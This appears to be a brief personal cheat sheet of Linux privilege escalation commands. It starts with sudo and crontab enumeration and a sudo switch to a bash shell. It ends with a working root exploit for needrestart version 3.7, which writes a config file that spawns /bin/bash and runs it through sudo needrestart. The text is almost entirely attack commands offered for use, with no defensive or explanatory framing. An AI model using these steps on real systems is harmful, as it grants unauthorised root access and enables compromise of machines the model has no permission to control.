##simple commands
```
ls -la
sudo -su
sudo -l
crontab -l
```
##using /bin/bash 
```
sudo -u user /bin/bash
```
##needrestart v3.7
```
echo 'system("/bin/bash");' > /tmp/root.sh

Now run needrestart, with sudo, using using that configuration file as an argument:

sudo /usr/sbin/needrestart -c /tmp/root.sh
